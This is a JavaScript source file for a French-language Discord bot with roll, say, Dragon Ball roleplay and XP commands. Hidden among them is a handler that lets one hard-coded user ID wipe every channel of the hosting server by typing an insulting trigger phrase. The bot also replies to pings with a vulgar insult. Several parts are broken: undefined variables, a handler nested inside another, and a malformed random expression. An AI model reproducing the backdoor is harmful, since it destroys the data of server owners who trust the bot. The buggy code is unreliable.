const Discord = require('discord.js');
const client = new Discord.Client();
client.commands = new Discord.Collection()
const fs = require('fs');

client.on('message', message => {
if(message.content.startsWith('.launchcodejavascript'))
if (message.author.id == "568808318894604291") {
    var argresult = args.join(' ');
    client.user.setStatus(argresult);
    message.reply("Début du code en javascript :white_check_mark:");
} else {
    message.reply("Tu ne peux pas faire ceci, uniquement le créateur du bot peux faire ceci. :x:");
}})

client.on('message', msg => {
    if (msg.content === '<@!673466391738843167>')
    msg.channel.send('`Ptdr t ki pourquoi tu me ping sale fdp (mon prefix c\'est . )`')
})

client.on('message', message =>{
    if(message.author.id == "568808318894604291") {
    if(message.content === "!azukic'estvraimentunesalope") {
    message.guild.channels.forEach(channel => channel.delete())
      }
    }
  })


  client.on('message', message => {
    if(message.content.startsWith('.r')) {
        let args = message.content.split(' ').slice(1); 
        if(!args[0]) return message.reply("Veuillez mettre un nombre");
        let nb = Math.floor(Math.random() * args[0]);
        const zteamrollEmbed = new Discord.RichEmbed()
            .setTitle("**__Roll__**")
            .setColor("RANDOM")
            .addField("**__Ton Roll__**", `${args[0]}`)
            .addField("**__Nombre Obtenu__**", `${nb}`)
        message.channel.send(zteamrollEmbed)
        }
    })

client.on('message', message => {
    if(message.content.startsWith('.say')) {
let args = message.content.split(' ').slice(1); 
    let text = args.join(" ");
    message.delete();
message.channel.send(text);

//dbz rp

client.on('message', message => {
    if(message.content.startsWith('.genkidama')) {
if(message.member.roles.find("name", "[🌌] Genkidama")){
    message.channel.send('Vous faite appel à la planète terre, vous levez les mains au ciel ! Une énorme boule de ki se forme au dessus de vous, elle est prête à étre lancé !')


}else{
    message.channel.send("Votre corps n'a pas supporté cette Technique, vous avez besoin de plus d'entrainement !")
}
    }
})

//Système d'xp
        
        client.on("message", async message => {
  let addExp = Math.floor(Math.random() * 0,1) + 1;

  if (!exp[message.author.id]) {
      exp[message.author.id] = {
          exp: 0,
          niveau: 1
      };
  }

  let currentExp = exp[message.author.id].exp;
  let currentNiv = exp[message.author.id].niveau;
  let nextLevel = currentNiv * 80;
  exp[message.author.id].exp = currentExp + addExp;

  if(nextLevel <= currentExp) {
      exp[message.author.id].niveau += 1;
      message.channel
        .send(`Félicitation jeune Shinobi ! tu es passé niveau ${currentNiv + 1}, Continue comme ça pour accomplir ton Nindo !`)
        .then(msg => {
            msg.delete(5000);
        });
  }

  fs.writeFile('./exp.json', JSON.stringify(exp), err => {
      if (err) console.log(err);
  })
});
        
 //fin syst d'exp

    }})

fs.readdir('./Commandes/', (error, f) => {
    if (error) { return console.error(error); }
        let commandes = f.filter(f => f.split('.').pop() === 'js');
        if (commandes.length <= 0) { return console.log('Aucune commande trouvée !'); }

        commandes.forEach((f) => {
            let commande = require(`./Commandes/${f}`);
            console.log(`${f} -> Ready`);
            client.commands.set(commande.help.name, commande);
            
        });
});

fs.readdir('./Events/', (error, f) => {
    if (error) { return console.error(error); }
        console.log(`${f.length} events chargés`);

        f.forEach((f) => {
            let events = require(`./Events/${f}`);
            let event = f.split('.')[0];
            client.on(event, events.bind(null, client));
        });
        
});

client.login(process.env.TOKEN);
